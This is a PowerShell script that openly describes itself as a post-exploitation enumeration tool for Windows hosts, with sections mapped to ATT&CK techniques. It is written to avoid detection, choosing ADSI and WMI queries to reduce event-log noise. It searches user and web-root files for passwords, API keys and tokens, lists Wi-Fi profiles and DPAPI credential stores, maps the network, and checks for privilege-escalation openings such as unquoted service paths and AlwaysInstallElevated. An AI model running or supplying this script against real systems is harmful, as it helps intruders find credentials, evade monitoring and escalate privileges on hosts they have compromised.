<#
.SYNOPSIS
  Post-exploitation enumeration for Windows hosts (PowerShell-native).
.DESCRIPTION
  ATT&CK-mapped, OPSEC-conscious enumeration. Prefers .NET/WMI queries over
  legacy `net` commands to reduce 4799/4662 event noise.
.USAGE
  PS> .\enum_windows.ps1 -OutputDir C:\Windows\Temp\.cache -Quiet
#>
[CmdletBinding()]
param(
    [string]$OutputDir = (Join-Path $env:TEMP ("enum_" + (Get-Date -Format 'yyyyMMddTHHmmssZ'))),
    [switch]$Quiet
)

$ErrorActionPreference = 'SilentlyContinue'
$Ts = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null
$script:Quiet = $Quiet
function Write-Log([string]$msg) {
    if (-not $script:Quiet) { Write-Host "[*] $msg" -ForegroundColor Cyan }
}
function Save-Check([string]$Check, [scriptblock]$Block) {
    Write-Log "Collecting: $Check"
    $header = "### check=$Check host=$env:COMPUTERNAME ts=$Ts"
    $data   = & $Block 2>&1 | Out-String
    Set-Content -Path (Join-Path $OutputDir "$Check.txt") -Value "$header`n$data" -Encoding UTF8
}

# --- T1082 System discovery -----------------------------------------------------
Save-Check 'system_info' {
    Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture, LastBootUpTime | Format-List
    Get-CimInstance Win32_ComputerSystem  | Select-Object Manufacturer, Model, TotalPhysicalMemory | Format-List
}
Save-Check 'patch_level' {
    Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 15 HotFixID, InstalledOn
}

# --- T1087/T1069 Account & privilege discovery ----------------------------------
Save-Check 'current_user' {
    [System.Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name, IsSystem, AuthenticationType | Format-List
    whoami /priv
    whoami /groups
}
Save-Check 'local_admins' {
    # ADSI query instead of `net localgroup` — less event noise
    ([ADSI]"WinNT://./Administrators,group").Invoke('Members') | ForEach-Object {
        $_.GetType().InvokeMember('Name','GetProperty',$null,$_,$null)
    }
}

# --- T1555/T1552 Credential discovery -------------------------------------------
Save-Check 'creds_files' {
    Get-ChildItem -Path $env:USERPROFILE,$env:ProgramFiles,'C:\inetpub\wwwroot' -Recurse -Include *.config,*.xml,*.ini,*.ps1 -ErrorAction SilentlyContinue |
        Select-String -Pattern 'password|apikey|secret|token' -List | Select-Object -First 25 Path
}
Save-Check 'wifi_profiles' {
    (netsh wlan show profiles) 2>&1
}
Save-Check 'dpapi_candidates' {
    Get-ChildItem "$env:APPDATA\Microsoft\Protect","$env:LOCALAPPDATA\Microsoft\Credentials" -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
}

# --- T1016/T1046 Network discovery ----------------------------------------------
Save-Check 'network_config' {
    Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway | Format-List
    Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object DestinationPrefix, NextHop
}
Save-Check 'listening_svcs' {
    Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess | Sort-Object LocalPort
}
Save-Check 'arp_cache' {
    Get-NetNeighbor -State Reachable | Select-Object IPAddress, LinkLayerAddress
}

# --- Privesc candidates -----------------------------------------------------------
Save-Check 'services_unquoted' {
    Get-CimInstance Win32_Service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } |
        Select-Object Name, PathName, StartMode
}
Save-Check 'always_installelevated' {
    Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer','HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' |
        Select-Object AlwaysInstallElevated
}

Write-Log "Done. Artifacts in $OutputDir"
